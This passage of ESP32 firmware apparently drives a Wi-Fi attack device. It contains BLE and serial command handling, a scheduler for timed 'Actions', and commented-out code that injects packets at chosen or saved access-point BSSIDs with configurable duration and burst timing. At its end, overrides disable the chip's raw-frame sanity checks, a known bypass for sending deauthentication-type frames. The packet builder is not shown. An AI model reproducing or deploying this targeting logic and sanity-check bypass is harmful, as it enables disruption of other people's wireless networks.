      if (activeActionInstance.state == ACTION_INSTANCE_PAUSE_REQUESTED ||
          activeActionInstance.state == ACTION_INSTANCE_PAUSED) {
        activeActionInstance.state = ACTION_INSTANCE_RUNNING;
      }
    }
    Serial.println("[Scheduler] Resume All enabled; pending occurrences will be processed in due-time order.");
    sendSimpleResponse("SCHED_RESUME_ALL:OK");
  } else if (strcmp(command, "ACTION_PAUSE") == 0) {
    if (actionActive && actionTaskHandle != nullptr) {
      actionPauseRequested = true;
      if (activeActionInstance.state == ACTION_INSTANCE_RUNNING) {
        activeActionInstance.state = ACTION_INSTANCE_PAUSE_REQUESTED;
      }
      sendSimpleResponse("ACTION_PAUSE_REQUESTED");
    } else {
      sendSimpleResponse("ACTION_NOT_RUNNING");
    }
  } else if (strcmp(command, "ACTION_RESUME") == 0) {
    if (actionActive && actionTaskHandle != nullptr) {
      actionPauseRequested = false;
      // If the pause had not yet been acknowledged, cancel that pending transition.
      if (activeActionInstance.state == ACTION_INSTANCE_PAUSE_REQUESTED) {
        activeActionInstance.state = ACTION_INSTANCE_RUNNING;
      }
      sendSimpleResponse("ACTION_RESUME_REQUESTED");
    } else {
      sendSimpleResponse("ACTION_NOT_RUNNING");
    }
  } else if (strcmp(command, "STOP") == 0 ||
             strcmp(command, "MANUAL_STOP") == 0) {
    char response[64] = {0};
    // STOP remains a backwards-compatible manual-only stop for either
    // manual Action type. The app's individual button uses MANUAL_STOP.
    const int actionTypeFilter = strcmp(command, "STOP") == 0
        ? -1 : SCHEDULE_ACTION_INDIVIDUAL;
    stopManualActionInstance(actionTypeFilter, response, sizeof(response));
    if (strcmp(command, "STOP") == 0 &&
        strcmp(response, "MANUAL_STOP:REQUESTED") == 0) {
      sendSimpleResponse("STOPPED");
    } else {
      sendSimpleResponse(response);
    }
  } else if (strcmp(command, "MANUAL_STOP_ALL") == 0) {
    char response[64] = {0};
    stopManualActionInstance(SCHEDULE_ACTION_ALL, response, sizeof(response));
    sendSimpleResponse(response);
  } else if (strcmp(command, "REBOOT") == 0) {
    sendBLEMessage("{\"event\":\"REBOOTING\"}");
    delay(300);
    ESP.restart();
  } else if (isActionCommand) {
    if (actionTaskHandle != nullptr && actionActive) {
      // Manual Action/Action All can preempt a scheduled foreground instance.
      // The current scheduled instance is saved on the interruption stack first;
      // loop() starts this manual command only after the runner has fully yielded.
      if (activeActionInstance.state != ACTION_INSTANCE_EMPTY &&
          activeActionInstance.scheduleId != 0 &&
          !pendingManualActionStart &&
          interruptedActionCount < MAX_ACTION_INSTANCES) {
        strncpy(pendingManualActionCommand, command,
                sizeof(pendingManualActionCommand) - 1);
        pendingManualActionCommand[sizeof(pendingManualActionCommand) - 1] = '\0';
        pendingManualActionStart = true;
        actionPauseRequested = true;
        actionYieldRequested = true;
        activeActionInstance.state = ACTION_INSTANCE_PAUSE_REQUESTED;
        Serial.printf("[Action] Manual %s requested; scheduled instance %lu will be paused and preserved.\n",
                      strncmp(command, "ACTION_ALL", 10) == 0 ? "Action All" : "Action",
                      static_cast<unsigned long>(activeActionInstance.instanceId));
        sendSimpleResponse("MANUAL_ACTION_QUEUED");
      } else {
        Serial.println("[Action] Manual Action rejected: runner is busy or interruption stack is full.");
        sendSimpleResponse("MANUAL_ACTION_REJECTED:BUSY");
      }
    } else if (actionTaskHandle == nullptr) {
      startActionTask(strncmp(command, "ACTION_ALL", 10) == 0, command);
    }
  }
    /*else if (strcmp(command, "ACTION_ALL") == 0 || strncmp(command, "ACTION_ALL:", 11) == 0) {
    String payload = "";
    if (strncmp(command, "ACTION_ALL:", 11) == 0) {
      payload = String(command + 11);
    }
    
    String tokens[3] = {"1", "0", "0"};
    int tokenCount = 0;
    int lastIndex = 0;
    
    for (int i = 0; i <= payload.length(); i++) {
      if (i == payload.length() || payload[i] == ',') {
        if (tokenCount < 3 && lastIndex < i) {
          tokens[tokenCount++] = payload.substring(lastIndex, i);
        }
        lastIndex = i + 1;
      }
    }
    
    uint32_t durationSeconds = tokens[0].toInt();
    uint32_t burstSeconds    = tokens[1].toInt();
    uint32_t sleepSeconds    = tokens[2].toInt();

    const String index = savedBssidIndex();
    if (index.length() == 0) {
      sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"NO_NETWORKS_SAVED_IN_FLASH\"}");
      return;
    }

    sendBLEMessage("{\"event\":\"TX_ALL_START\"}");
    txAbortRequested = false;

    String currentBssid = "";
    while (!txAbortRequested) {
      for (size_t i = 0; i <= index.length(); ++i) {
        if (txAbortRequested) break;

        const char c = (i < index.length()) ? index[i] : ',';
        if (c == ',') {
          currentBssid.trim();
          if (currentBssid.length() > 0) {
            const String key = storageKeyForBssid(currentBssid);
            String savedJson = savedPreferences.getString(key.c_str(), "");
            
            int chanIndex = savedJson.indexOf("\"channel\":");
            if (chanIndex != -1) {
              int start = chanIndex + 10;
              int end = savedJson.indexOf(",", start);
              if (end == -1) end = savedJson.indexOf("}", start);
              
              if (end != -1) {
                uint8_t savedChannel = (uint8_t)savedJson.substring(start, end).toInt();
                if (savedChannel >= 1 && savedChannel <= 196) {
                  Serial.printf("[WiFi TX ALL] Targeting saved AP: %s on Channel %d\n", currentBssid.c_str(), savedChannel);
                  injectActionPacket(currentBssid, savedChannel, durationSeconds, burstSeconds, sleepSeconds);
                }
              }
            }
          }
          currentBssid = "";
        } else {
          currentBssid += c;
        }
      }
    }
    
    if (txAbortRequested) {
      sendBLEMessage("{\"event\":\"TX_ALL_ABORTED\"}");
    } else {
      sendBLEMessage("{\"event\":\"TX_ALL_DONE\"}");
    }
  } else if (strncmp(command, "ACTION:", 7) == 0) {
    String payload = String(command + 7);
    
    String tokens[4] = {"", "0", "0", "0"};
    int tokenCount = 0;
    int lastIndex = 0;
    
    for (int i = 0; i <= payload.length(); i++) {
      if (i == payload.length() || payload[i] == ',') {
        if (tokenCount < 4) {
          tokens[tokenCount++] = payload.substring(lastIndex, i);
        }
        lastIndex = i + 1;
      }
    }

    String targetBssid = tokens[0];
    targetBssid.trim();
    
    uint32_t durationSeconds = tokens[1].toInt();
    uint32_t burstSeconds    = tokens[2].toInt();
    uint32_t sleepSeconds    = tokens[3].toInt();

    APRecord ap;
    if (findLastScanAP(targetBssid, ap)) {
      injectActionPacket(ap.bssid, ap.channel, durationSeconds, burstSeconds, sleepSeconds);
    } else {
      const String key = storageKeyForBssid(targetBssid);
      if (savedPreferences.isKey(key.c_str())) {
        String savedJson = savedPreferences.getString(key.c_str(), "");
        int chanIndex = savedJson.indexOf("\"channel\":");
        if (chanIndex != -1) {
          int start = chanIndex + 10;
          int end = savedJson.indexOf(",", start);
          if (end == -1) end = savedJson.indexOf("}", start);
          
          if (end != -1) {
            String chanStr = savedJson.substring(start, end);
            uint8_t savedChannel = (uint8_t)chanStr.toInt();
            
            if (savedChannel >= 1 && savedChannel <= 196) {
              Serial.printf("[WiFi TX] Flash lookup hit. Targeting channel: %d\n", savedChannel);
              injectActionPacket(targetBssid, savedChannel, durationSeconds, burstSeconds, sleepSeconds);
            } else {
              sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"SAVED_AP_CHANNEL_INVALID\"}");
            }
          } else {
            sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"SAVED_AP_PARSE_FAILED\"}");
          }
        } else {
          sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"SAVED_AP_MISSING_CHANNEL_DATA\"}");
        }
      } else {
        sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"UNKNOWN_TARGET_BSSID\"}");
      }
    }
  }*/else {
    sendSimpleResponse("UNKNOWN_CMD");
  }
}

void bleTask(void* parameter) {
  if (!NimBLEDevice::init(BLE_NAME)) {
    vTaskDelete(nullptr);
    return;
  }
  NimBLEDevice::setMTU(247);
  bleServer = NimBLEDevice::createServer();
  NimBLEService* service = bleServer->createService(NUS_SERVICE_UUID);
  
  NimBLECharacteristic* rxCharacteristic = service->createCharacteristic(
    NimBLEUUID(NUS_RX_UUID), NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::WRITE_NR
  );
  txCharacteristic = service->createCharacteristic(
    NimBLEUUID(NUS_TX_UUID), NIMBLE_PROPERTY::NOTIFY
  );

  rxCharacteristic->setCallbacks(&rxCallbacks);
  txCharacteristic->setCallbacks(&txCallbacks);
  service->start();
  bleServer->advertiseOnDisconnect(true);

  NimBLEAdvertising* advertising = NimBLEDevice::getAdvertising();
  advertising->enableScanResponse(true);
  advertising->addServiceUUID(NUS_SERVICE_UUID);
  advertising->setName(BLE_NAME);
  advertising->start();

  bleReady = true;
  vTaskDelete(nullptr);
}

void setup() {
  Serial.begin(115200);
  delay(1800);
  savedPreferences.begin("wifi-aps", false);
  schedulerPreferences.begin("scheduler", false);
  const String savedTimezoneRule = schedulerPreferences.getString("tzrule", "");
  if (!savedTimezoneRule.isEmpty()) {
    if (applyPosixTimezoneRule(savedTimezoneRule.c_str())) {
      Serial.printf("[Time] Restored POSIX timezone rule: %s\n", savedTimezoneRule.c_str());
    } else {
      Serial.println("[Time] WARNING: Saved POSIX timezone rule is invalid; local recurrence conversion is unavailable.");
    }
  }
  if (loadSchedulerStorage()) {
    Serial.printf("[Scheduler] Storage ready. Saved schedules: %u\n",
                  static_cast<unsigned int>(schedulerData.count));
  } else {
    Serial.println("[Scheduler] WARNING: Scheduler storage could not be initialized.");
  }
  if (loadRecurringRunStorage()) {
    Serial.println("[Scheduler] Recurring occurrence history ready.");
  } else {
    Serial.println("[Scheduler] WARNING: Recurring occurrence history could not be initialized.");
  }
  commandQueue = xQueueCreate(8, MAX_COMMAND_LENGTH);
  xTaskCreate(bleTask, "BLE_Init_Task", 12288, nullptr, 5, nullptr);
}

void loop() {
  // Fail-safe release if the phone disconnects or abandons a save transaction (2 minutes).
  // A pre-existing user pause is never cleared by this timeout.
  if (networkSavePauseActive && networkSavePauseStartedMs != 0 &&
      millis() - networkSavePauseStartedMs > 120000UL) {
    networkSavePauseActive = false;
    if (networkSavePauseOwnedAction && actionActive && actionTaskHandle != nullptr &&
        !schedulerPauseAllRequested) {
      actionPauseRequested = false;
      if (activeActionInstance.state == ACTION_INSTANCE_PAUSED ||
          activeActionInstance.state == ACTION_INSTANCE_PAUSE_REQUESTED) {
        activeActionInstance.state = ACTION_INSTANCE_RUNNING;
      }
    }
    networkSavePauseOwnedAction = false;
    networkSavePauseAckSent = false;
    networkSavePauseStartedMs = 0;
    sendSimpleResponse("NETWORK_SAVE_ERROR:TIMEOUT_RELEASED");
    Serial.println("[Network Save] Transaction timed out; maintenance pause released.");
  }

  if (bleReady && commandQueue != nullptr) {
    char command[MAX_COMMAND_LENGTH] = {0};
    while (xQueueReceive(commandQueue, command, 0) == pdTRUE) {
      processCommand(command);
    }
  }

  if (Serial.available() > 0) {
    String serialInput = Serial.readStringUntil('\n');
    serialInput.trim();
    if (serialInput.length() > 0 && serialInput.length() < MAX_COMMAND_LENGTH) {
      char command[MAX_COMMAND_LENGTH] = {0};
      strncpy(command, serialInput.c_str(), sizeof(command) - 1);
      Serial.printf("[Serial RX] Executing: %s\n", command);
      processCommand(command);
    }
  }

  // Give a queued manual Action priority over automatic stack resumption.
  // The interrupted scheduled Action remains safely stored on the LIFO stack.
  if (pendingManualActionStart && actionTaskHandle == nullptr && !actionActive &&
      !wifiScanPauseActive) {
    char command[MAX_COMMAND_LENGTH] = {0};
    strncpy(command, pendingManualActionCommand, sizeof(command) - 1);
    pendingManualActionCommand[0] = '\0';
    pendingManualActionStart = false;
    const bool isAllAction = strncmp(command, "ACTION_ALL", 10) == 0;
    if (!startActionTask(isAllAction, command)) {
      Serial.println("[Action] Could not start queued manual Action; scheduler will resume the interrupted instance.");
      sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"MANUAL_ACTION_START_FAILED\"}");
    }
  }

  pollDueScheduledActions();
  pollWiFiScan();
  delay(5);
}

extern "C" {
  int wdev_is_valid_raw_tx_frame(void* wdev, uint8_t* frame, size_t len) {
      return 0; 
  }
  int ieee80211_raw_frame_sanity_check(void* aux, uint8_t* frame, size_t len) {
      return 0; 
  }
}
